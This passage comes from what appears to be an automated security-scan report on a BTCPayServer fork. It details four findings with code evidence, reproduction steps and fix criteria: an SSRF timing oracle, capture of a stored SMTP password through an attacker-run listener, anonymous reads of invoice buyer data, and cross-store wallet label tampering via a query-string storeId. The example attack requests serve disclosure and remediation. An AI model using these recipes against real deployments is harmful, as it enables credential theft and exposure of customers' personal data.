`SocketFactory.ConnectAsync` swallows every exception, so the page always reports success; the observable is latency: a host that answers (SYN-ACK or RST) returns at once, an unreachable address in the same subnet fails after the ARP/no-route delay, and a silently filtered destination holds the request for the full 20 s `CancellationTokenSource` timeout. Repeated tests with different advertised host:port values give a blind host-liveness / filtering oracle over the Docker network, the host's LAN or VPN, and cloud metadata addresses; it does not distinguish open from refused ports, no payload is sent and nothing is read. Impact is limited to that oracle and to connection-establishment side effects on the target.

Assumptions on pinned dependencies: BTCPayServer.Lightning.All 1.7.13 parses the node's advertised URIs into `NodeInfo` without address filtering; NBitcoin 10.0.15 `DefaultEndpointConnector.ConnectSocket` connects directly for non-onion endpoints (SOCKS only for .onion by default) and honours the cancellation token.

## Evidence
1. [BTCPayServer/Controllers/UIStoresController.LightningLike.cs:198–218](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIStoresController.LightningLike.cs#L198-L218)
   command=test: fetches NodeInfo from the store-supplied node and, unless the attacker-controlled SkipPortTest checkbox is set, calls handler.TestConnection(info.First(), 20 s token) on the first node-advertised host:port. No address-class check; errors from the socket are swallowed below, so only the elapsed time is observable. This is where the fix belongs (validate or skip the second hop for non-admins).
2. [BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs:213–226](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs#L213-L226)
   TestConnection parses nodeInfo.Host/Port into an EndPoint with Utils.TryParseEndpoint and connects via SocketFactory with no IsLocalNetwork/IsPublicAddress check.
3. [BTCPayServer/Services/SocketFactory.cs:20–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/SocketFactory.cs#L20-L43)
   ConnectAsync performs a plain TCP connect (DNS resolution for hostnames, SOCKS only for onion) to the given endpoint and catches all exceptions, so refused/unreachable/timeout all return 'success'; the only observable is latency (immediate versus the 20 s cancellation).
4. [BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs:182–185](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs#L182-L185)
   NodeInfoList is taken verbatim from the remote node's GetInfo response; only the Tor/clearnet preference is applied, so the remote node (chosen by the store member) decides which host:port BTCPay will connect to.
5. [BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs:275–290](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs#L275-L290)
   The shipped control for this surface: for non-admins the connection string must pass IsSafeLightningConnectionString (rejects local endpoints) and AllowUnsafeConnection is forced false, selecting the SSRF-guarded lightning.safe HttpClient for the first hop. The second hop (node-advertised endpoint) is outside this control.
6. [BTCPayServer/SSRFProtectionExtensions.cs:45–51](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/SSRFProtectionExtensions.cs#L45-L51)
   The guarded HttpClient's ConnectCallback skips every private resolved address without attempting a connection — the project denies this position even a TCP connect to private hosts on the first hop, which the TestConnection path then performs on the second.
7. [BTCPayServer/Controllers/UIPublicLightningNodeInfoController.cs:80](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPublicLightningNodeInfoController.cs#L80)
   Elsewhere the code treats node-advertised hosts as potentially local (NodeData.IsLocal = IsLocalNetwork(nodeInfo.Host)), showing the maintainers know this value can point inside the network; the test path applies no such filter.

## Impact
Blind inference of internal host liveness and packet filtering via timing (immediate return versus ARP/no-route delay versus the 20 s timeout) over the Docker network, LAN/VPN and metadata addresses — a limited confidentiality leak about the server's network topology. Open and refused ports are indistinguishable, no bytes are sent and none read, and the connection is closed immediately, so no integrity or availability impact.

## Reproduction steps
1. Attacker: a store member holding CanModifyStoreSettings (any self-registered user who creates a store) who operates a public HTTP(S) endpoint emulating a Lightning node's getinfo. They submit the setup form with command=test and a connection string pointing at that endpoint (which passes IsSafeLightningConnectionString because it is public), and BTCPay TCP-connects to whatever internal host:port the endpoint advertises. Default deployment, no operator misconfiguration needed; the observable is response latency of the attacker's own request.

## Recommended fix
TestConnection connects to an endpoint advertised by an untrusted remote Lightning node without applying the public-address policy (IsSafeLightningConnectionString / SSRF ConnectCallback) that governs the store-supplied first hop. Fix criteria: Before any socket is opened, the node-advertised host:port (and every address it resolves to) must be subject to the same private/loopback/link-local rejection and ssrfexceptions allow-list as store-supplied endpoints, or the port test must be unavailable to users without CanModifyServerSettings. Verify that a node advertising a private IP, loopback, link-local address or internal hostname never results in a connection attempt from the server and that the user receives an explicit message instead.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Server-Side Request Forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257447

---

# Stored SMTP password is replayed to a caller-chosen host, defeating its write-only masking

## Details
Both the store and server SMTP configuration treat the SMTP password as write-only: Greenfield GET returns only PasswordSet (EmailSettings.ToData, swagger: 'true if the password has been set'), the UI renders 'Configured' with a Reset button, and the maintainers' tests assert 'email password is masked and not returned from the server once set' (BTCPayServer.Tests/EmailsTests.cs:151-153, 197-199). The same principals who are denied reading the password can nevertheless make the server authenticate with it against a host they choose.

UIEmailControllerBase.EmailSettingsCore (command=Test, lines 47-51): when the posted hidden field PasswordSet is true, the stored password is copied into model.Settings, whose Server, Port, Login and DisableCertificateCheck come from the same form. For a store, UIStoresEmailController.GetEmailSettingsForTest (line 70) returns model.Settings whenever the posted IsCustomSMTP is true; line 65 then calls CreateSmtpClient, which connects to Server:Port with SecureSocketOptions.Auto (EmailSettings.cs:113) and calls AuthenticateAsync(Login, Password) as soon as the peer advertises AUTH (lines 114-117). An attacker runs an SMTP listener advertising AUTH PLAIN/LOGIN, points Server at it, presses Test, and receives the plaintext credential. Disabling certificate checks is not required: the listener can omit STARTTLS (Auto then proceeds in cleartext) or present a certificate valid for its own hostname. ex.Message is echoed to the caller (line 77).

The Save path (lines 115-117) keeps the stored password unconditionally while accepting a new Server/Port, and Greenfield PUT /api/v1/stores/{storeId}/email and PUT /api/v1/server/email apply EmailSettings.FromData (lines 39-40), which retains the stored password whenever Login is supplied and Password omitted. After such a save every email the store sends (EmailSender.SendEmail background job, EmailSender.cs:32) or POST /api/v1/stores/{storeId}/email/send authenticates to the attacker host with the retained password.

Who can do this: for a store, any principal with CanModifyStoreSettings on that store. Among built-in roles only Owner holds it (Migrations 20240904092905_UpdateStoreOwnerRole; Manager does not), but custom roles may grant it and any API key scoped to btcpay.store.canmodifystoresettings — including keys issued to third-party applications through /api-keys/authorize — qualifies; such holders never knew the password the configuring owner entered. For the server settings the position is a CanModifyServerSettings API key (a cookie-authenticated server admin already has plugin upload and gains nothing). The credential is typically a third-party mail account secret (Gmail app password, Mailgun/SendGrid key), so its exposure reaches outside BTCPay. The threat model lists store email credentials as a store-isolation asset and names API keys with narrow scopes trying to 'read keys' as an adversary.

Dependency assumption: MailKit 4.18.1 (BTCPayServer.csproj:46) SmtpClient with SecureSocketOptions.Auto continues in cleartext when the server does not advertise STARTTLS and AuthenticateAsync uses whichever SASL mechanism the server advertises (PLAIN/LOGIN included) without refusing cleartext authentication; no project test or usage contradicts this.

## Evidence
1. [BTCPayServer/Plugins/Emails/Controllers/UIEmailControllerBase.cs:43–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Controllers/UIEmailControllerBase.cs#L43-L78)
   command=Test: when the posted hidden PasswordSet is true (line 47) the stored password is copied into the caller-supplied model.Settings (line 50), and line 65 opens an SMTP session with those settings — caller-chosen Server, Port, Login, DisableCertificateCheck plus the stored secret — so the server authenticates with the masked password against whatever host the caller named; ex.Message is echoed at line 77.
2. [BTCPayServer/Plugins/Emails/Services/EmailSettings.cs:100–125](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Services/EmailSettings.cs#L100-L125)
   CreateSmtpClient connects to Server:Port with SecureSocketOptions.Auto (cleartext if the peer offers no STARTTLS), accepts any certificate when DisableCertificateCheck is set, and sends Login/Password via AuthenticateAsync whenever the peer advertises AUTH, so an attacker-run listener advertising PLAIN/LOGIN captures the plaintext credential.
3. [BTCPayServer/Plugins/Emails/Controllers/UIEmailControllerBase.cs:106–120](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Controllers/UIEmailControllerBase.cs#L106-L120)
   The Save path keeps the stored password unconditionally (lines 115-117) while accepting a new Server/Port from the form, so saving attacker-host settings and then triggering any store email leaks the credential through the background sender.
4. [BTCPayServer/Plugins/Emails/Services/EmailSettings.cs:32–54](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Services/EmailSettings.cs#L32-L54)
   FromData (lines 39-40) retains the stored password whenever Login is supplied and Password omitted while taking Server/Port/DisableCertificateCheck from the request; ToData returns only PasswordSet, establishing that the password is meant to be unreadable once stored.
5. [BTCPayServer/Controllers/GreenField/GreenfieldStoreEmailController.cs:58–76](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStoreEmailController.cs#L58-L76)
   PUT /api/v1/stores/{storeId}/email (CanModifyStoreSettings) applies FromData with the existing password, so an API key can re-point Server/Port at an attacker host while the stored password is retained and later replayed by every store email.
6. [BTCPayServer/Plugins/Emails/Controllers/UIStoresEmailController.cs:44–47](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Controllers/UIStoresEmailController.cs#L44-L47)
   The store POST handler is gated only by CanModifyStoreSettings; GetEmailSettingsForTest (line 70) returns the caller's model.Settings whenever the posted IsCustomSMTP is true, so the Test session uses the caller's host.
7. [BTCPayServer/Plugins/Emails/Views/Shared/EmailSettings.cshtml:126–141](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/Views/Shared/EmailSettings.cshtml#L126-L141)
   The UI renders only 'Configured' plus a Reset button once a password exists and never echoes it, and posts PasswordSet as a hidden field the client controls — the write-only design the Test/Save paths undermine.

## Impact
A secret the system explicitly masks from this principal (the SMTP password; EmailsTests asserts it is never returned) is disclosed. Within BTCPay it is one credential of a component the attacker can already reconfigure, so confidentiality impact on the vulnerable system is LOW; integrity and availability are unaffected. Subsequent-system impact: The leaked value is the password or API key of an external mail account (e.g. a Gmail app password or Mailgun key) belonging to the person who configured it; the attacker can authenticate to that provider directly, send as that account and, depending on the credential, read its mail. Scope of the external account cannot be determined from the code, so rated LOW.

## Reproduction steps
1. Attacker: a store member or API key with CanModifyStoreSettings on a store whose SMTP password was configured by someone else (co-owner, custom role, or a third-party application granted that scope via /api-keys/authorize), or a CanModifyServerSettings API key for the server settings. They run an SMTP listener advertising AUTH PLAIN/LOGIN (no STARTTLS, or a certificate valid for its own host), open the Emails settings page, set Server/Port to their host, keep the hidden PasswordSet=true, enter any TestEmail and press Test — or PUT the same settings via Greenfield with Login set and Password omitted and wait for the next email. The stored password arrives in the AUTH exchange. Reliable, no race, default configuration; the SMTP client is not covered by the SSRF guard.

## Recommended fix
The stored SMTP password is bound to no host: the Test command, the UI Save path and both Greenfield PUT endpoints reuse it against whatever Server/Port/TLS settings the caller supplies, so a secret the system masks as write-only can be exfiltrated by redirecting the connection. Fix criteria: A stored password must only ever be sent to the Server/Port it was saved with: changing Server or Port (or disabling certificate checks) without re-entering the password must clear the stored one, and the Test command must not combine a stored password with unsaved connection parameters. Verify: with a password stored, submitting Test, Save or PUT with a different Server and no password results in no AUTH attempt against the new host.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Credential exposure
**CWE:** [CWE-522](https://cwe.mitre.org/data/definitions/522.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257441

---

# Anonymous Bitpay GET /invoices/{id} returns buyer PII for any invoice of an AnyoneCanInvoice store

## Details
BitpayAuthorizationHandler (BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs:31-61) resolves an anonymous Bitpay caller's store from the ?storeId= query parameter and grants Policies.CanCreateInvoice whenever that store's blob has AnyoneCanInvoice. BitpayInvoiceController is gated as a whole by that single policy (lines 26-28), and GetInvoice (lines 67-79) uses it to return the full merchant-facade InvoiceResponse for any invoice id belonging to the store, with no check that the caller created the invoice or holds any secret beyond the id. The merchant deliberately opened invoice creation (the Pay Button feature sets AnyoneCanInvoice, UIPayButtonController.cs:82), not invoice reading, yet the two are conflated.

What leaks: InvoiceEntity.EntityToDTO (InvoiceEntity.cs:660-670) populates `buyer` with name, address lines, city, region, postal code, country, phone and email, plus orderId, itemCode, itemDesc, legacy posData, the per-payment-method destinations and payment history. The public checkout page and the public receipt page for the same invoice id do not expose the buyer block (UIInvoiceController.UI.cs:47-53 excludes InvoiceMetadata properties from receipt additional data), so the Bitpay endpoint is a strictly larger disclosure for anyone holding an invoice id. Buyer fields are set by Greenfield/Bitpay merchants, by PoS/crowdfund/payment-request forms and by checkout-form submissions, i.e. they are customer PII the merchant collected.

Attack path: an unauthenticated client sends `GET /invoices/<invoiceId>?storeId=<storeId>&token=x` (the ?token= or a JSON Content-Type makes BitpayEndpointSelectorPolicy pick the Bitpay controller). The store id is public (it is embedded in the Pay Button HTML the merchant publishes, in PoS/crowdfund links and in checkout URLs); invoice ids are random but are shared in checkout, receipt and payment-request pages, appear in referrers, support tickets and screenshots, and a payment-request page lists the ids of all invoices created for it. Any party that learns an id - a second person who saw a checkout link, a co-worker, a payment-request viewer - obtains the buyer's identity and contact details.

The anonymous listing endpoint is not affected (GetInvoices refuses Bitpay.Anonymous), confirming the maintainers intended anonymous callers to create, not browse. The Greenfield equivalent (GET /api/v1/stores/{storeId}/invoices/{invoiceId}) requires btcpay.store.canviewinvoices. Root cause: the read endpoints hang off the create policy, and the handler treats AnyoneCanInvoice as authorising both.

## Evidence
1. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs:31–60](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs#L31-L60)
   For the Bitpay.Anonymous identity the store is taken from the storeId route value or ?storeId= query (lines 33-42), and Policies.CanCreateInvoice is granted whenever that store's blob has AnyoneCanInvoice (lines 54-59). The handler does not distinguish creating from reading; this is the code the fix must change.
2. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:67–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L67-L78)
   GetInvoice looks up any invoice id within the store resolved by the handler and returns EntityToDTO (full merchant facade) with no check that the anonymous caller created it; unlike GetInvoices (lines 95-96, which returns Forbid for BitpayAuthenticationTypes.Anonymous) it has no anonymous guard.
3. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:26–27](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L26-L27)
   The whole controller, read endpoints included, is gated only by [Authorize(Policies.CanCreateInvoice, AuthenticationSchemes = Bitpay)].
4. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs:50–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs#L50-L52)
   Any request without x-identity/x-signature headers is authenticated as BitpayAuthenticationTypes.Anonymous rather than failing, so a plain unauthenticated GET reaches the authorization handler as the Anonymous identity.
5. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:660–669](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L660-L669)
   EntityToDTO fills buyer name, address1/2, locality, region, postalCode, country, phone and email (plus orderId, itemDesc, legacy posData and per-payment destinations). Outside this DTO, buyer fields are rendered only in Views/UIInvoice/Invoice.cshtml behind CanViewInvoices; CheckoutModel has no buyer fields and the receipt excludes every InvoiceMetadata property except ReceiptData/PosData (UIInvoiceController.UI.cs:47-53).
6. [BTCPayServer/Plugins/Bitpay/BitpayEndpointSelectorPolicy.cs:56–59](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayEndpointSelectorPolicy.cs#L56-L59)
   GET /invoices/{id} is routed to the Bitpay controller (instead of the cookie-authenticated UI invoice page) for any client that adds ?token= or a JSON Content-Type, so the anonymous endpoint is reachable with a plain HTTP request.
7. [BTCPayServer/Plugins/PayButton/Views/Enable.cshtml:26](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Views/Enable.cshtml#L26)
   What the project concedes to the anonymous position: 'Once you do so, anyone could create an invoice on your store (via API, for example)'. The setting is labelled 'Allow anyone to create invoice' (Models/StoreViewModels/PaymentViewModel.cs:10); reading other payers' invoices is not part of that concession.
8. [BTCPayServer/Plugins/PayButton/Controllers/UIPayButtonController.cs:80–83](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PayButton/Controllers/UIPayButtonController.cs#L80-L83)
   AnyoneCanInvoice is the flag enabling the Pay Button turns on (it is also required by the public pay button at UIPublicPayButtonController.cs:56 and store-level LNURL pay at UILNURLController.cs:577), so the exposure applies to every store using those features, not only stores that consciously opened the legacy API.

## Impact
Discloses the buyer's name, postal address, phone, email, order/item details, legacy posData and payment destinations for each invoice whose id the attacker learns, on AnyoneCanInvoice stores; this is customer PII the merchant collected (checkout forms map buyerName/buyerAddress1 etc., FormDataService.cs:42-43) and that no public per-invoice page exposes. Scoped to individual invoices rather than store-wide listing (GetInvoices refuses Anonymous), so confidentiality impact is limited. No integrity or availability impact.

## Reproduction steps
1. Unauthenticated network client. Preconditions: the target store has AnyoneCanInvoice enabled (set by the Pay Button / 'Allow anyone to create invoice' toggle, required for the public pay button and store-level LNURL pay) and the attacker knows an invoice id of that store. Ids are random 16-byte Base58 values (InvoiceRepository.cs:57), so not enumerable, but they are bearer-visible: checkout and receipt URLs carry them, and the public payment-request page (Views/UIPaymentRequest/ViewPaymentRequest.cshtml:287 via Components/TruncateCenter/Default.cshtml:8 data-text) prints the full id of every invoice created for the request. A single GET /invoices/<id>?storeId=<storeId>&token=x then returns the merchant-facade DTO. No credentials, no user interaction, no shipped control to bypass beyond the conflated policy.

## Recommended fix
BitpayAuthorizationHandler grants the single CanCreateInvoice policy to anonymous callers of AnyoneCanInvoice stores, and the Bitpay read endpoints are protected by nothing more than that policy, so an opt-in to anonymous creation becomes anonymous reading of any invoice in the store. Fix criteria: An anonymous Bitpay caller must not be able to retrieve an invoice it did not create: GET /invoices/{id} (and /invoices) require a paired SIN whose token belongs to the invoice's store, or at most return the reduced public facade (no buyer block, posData or payment history) that the checkout page already exposes. Verify that GET /invoices/{id}?storeId= without BitId headers returns 401/403 or a response free of buyer fields on an AnyoneCanInvoice store.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257440

---

# Query-string storeId overrides route walletId in store-scope resolution, enabling cross-store wallet label and pending-tx actions

## Details
Every UIWalletsController action is routed as /wallets/{walletId}/... and guarded by a store-type policy ([Authorize(Policy = WalletPolicies.CanViewWallet)] at class level, stricter policies per action). For attribute-based authorization the store scope is resolved implicitly by BuiltInPermissionScopeProvider.SqlStoreScopeProvider.GetStoreId, which consults, in order: the HttpContext current store (null at authorization time, since SetContextFilter sets it only after authorization), the route value `storeId`, the QUERY STRING `storeId`, the FORM field `storeId`, and only then the route value `walletId`. The query/form branch is a sanctioned mechanism for store-less routes (/invoices?storeId=, /search/global?storeId=, /api/rates?storeId=), but wallet routes carry no `storeId`, so an authenticated user who appends `?storeId=<a store they belong to>` to any wallet URL has the policy evaluated against THEIR store (BuiltInPermissionHandler: FindStore + HasPolicy on that store), while the action still receives the route `walletId` of the VICTIM store via WalletIdModelBinder. No RouteValueToStoreIdQuery is registered for `walletId`, so the resolver's mismatch check never runs.

Most wallet actions are saved by the private helper GetDerivationSchemeSettings(WalletId) (UIWalletsController.cs:1954-1955), which returns null (404) when `GetCurrentStore().Id != walletId.StoreId`, or by explicit `authorizationService.AuthorizeAsync(User, walletId.StoreId, ...)`. The following actions have neither guard and act directly on the route walletId through WalletRepository / PendingTransactionService, which perform no ownership check of their own:

- GET {walletId}/labels.json (LabelsJson, CanViewWallet): returns every label of the victim wallet, or the labels attached to a given victim tx/address/utxo via type=&id= (which also confirms whether that object exists in the victim wallet).
- GET {walletId}/labels (WalletLabels, CanManageWalletSettings): same disclosure, rendered.
- POST {walletId}/update-labels (UpdateLabels, CanManageWalletTransactions): adds attacker-chosen labels to any victim wallet object (type/id attacker-chosen) and REMOVES every existing label on that object not present in the request.
- POST {walletId}/labels/import (ImportWalletLabels, CanManageWalletTransactions): bulk-adds labels to victim tx/address/utxo objects from a BIP-329 file.
- POST {walletId}/labels/{id}/delete and /edit (DeleteWalletLabel, EditWalletLabel, CanManageWalletSettings): deletes or renames a label across the whole victim wallet.
- POST {walletId}/pending/{id}/cancel (CancelPendingTransactionConfirmed, CanCancelWalletTransactions): cancels a victim store's pending multisig transaction if its random GUID is known.

Example: GET /wallets/S-<victimStoreId>-BTC/labels.json?storeId=<attackerStoreId> with the attacker's cookie returns the victim's wallet labels; POST /wallets/S-<victimStoreId>-BTC/labels/<label>/delete?storeId=<attackerStoreId> (with the attacker's own antiforgery token) deletes it. A secondary vector for form POSTs is to use the attacker's own wallet route and supply `walletId=S-<victim>-BTC` as a form field, since the form value provider precedes the route provider in the composite (assumption: default ASP.NET Core MVC value-provider order; the primary query-string vector needs no such assumption).

The attacker only needs an account with a store of their own holding the corresponding wallet permission there (self-registration where open, or invitation); a store Owner has all of them. Victim store IDs are routinely exposed (pay-button HTML, LN embed URLs, rate API). Wallet labels are the merchant's bookkeeping metadata (customer names, invoice/payout annotations), so this is cross-store disclosure plus tampering, and, with a known GUID, denial of a cosigning workflow.

## Evidence
1. [BTCPayServer/Security/BuiltInPermissionScopeProvider.cs:44–82](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/BuiltInPermissionScopeProvider.cs#L44-L82)
   Implicit store-scope resolution order: HttpContext current store (null at authorization time), route storeId (48-49), QUERY storeId (53-56), FORM storeId (62-66), and only last the route walletId (72-75). On /wallets/{walletId} routes an attacker-supplied ?storeId= therefore decides which store the policy is checked against, while the action binds walletId from the route. No RouteValueToStoreIdQuery is registered for walletId (only multisigSetupId, webhookId, offeringId), so the storeId2 != storeId mismatch check at 117 never runs for wallet routes.
2. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:2181–2206](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L2181-L2206)
   LabelsJson (class-level CanViewWallet) returns every label of the route walletId's wallet, or the labels of a given tx/address/utxo via type=&id=, straight from WalletRepository with no store-match or explicit authorization.
3. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:2156–2179](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L2156-L2179)
   UpdateLabels (CanManageWalletTransactions) adds attacker-chosen labels to an arbitrary wallet object of the route walletId (type/id from the JSON body) and removes every existing label on that object not present in the request, with no store-match check.
4. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:2208–2280](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L2208-L2280)
   WalletLabels, DeleteWalletLabel and EditWalletLabel (CanManageWalletSettings) read, delete and rename labels for the route walletId without GetDerivationSchemeSettings or explicit authorization against walletId.StoreId.
5. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:2283–2320](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L2283-L2320)
   ImportWalletLabels (CanManageWalletTransactions) bulk-writes BIP-329 labels to tx/address/utxo objects of the route walletId with no store-match check.
6. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:111–124](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L111-L124)
   CancelPendingTransactionConfirmed (CanCancelWalletTransactions) cancels the pending transaction identified by (route walletId.CryptoCode, walletId.StoreId, pendingTransactionId) with no store-match check; the GUID (PendingTransactionService.cs:107) must be known.
7. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:1954–1955](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L1954-L1955)
   GetDerivationSchemeSettings(WalletId) is the guard the other wallet actions rely on: it returns null (404) when GetCurrentStore().Id != walletId.StoreId. The affected actions never call it.
8. [BTCPayServer/Security/SetContextFilter.cs:31–36](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/SetContextFilter.cs#L31-L36)
   The HttpContext current store is set only here, in an action filter that runs after authorization, from the store BuiltInPermissionHandler accepted (the attacker's). So GetCurrentStoreId() is null when the scope provider runs, and GetCurrentStore() in the controller is the attacker's store, not the wallet's.
9. [BTCPayServer/Security/PermissionAuthorizationHandler.cs:29–40](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/PermissionAuthorizationHandler.cs#L29-L40)
   For attribute-based [Authorize] the resource is not a string, so the scope comes from GetImplicitScope -> the scope provider above; BuiltInPermissionHandler then succeeds against whatever store that returned (the attacker's own, where they hold the policy) and caches it as the current store.
10. [BTCPayServer/ModelBinders/WalletIdModelBinder.cs:16–27](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/ModelBinders/WalletIdModelBinder.cs#L16-L27)
   The binder parses walletId from the composite value provider (route on the primary vector) and never relates it to the store the policy was evaluated for.
11. [BTCPayServer/Services/WalletRepository.cs:285–299](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/WalletRepository.cs#L285-L299)
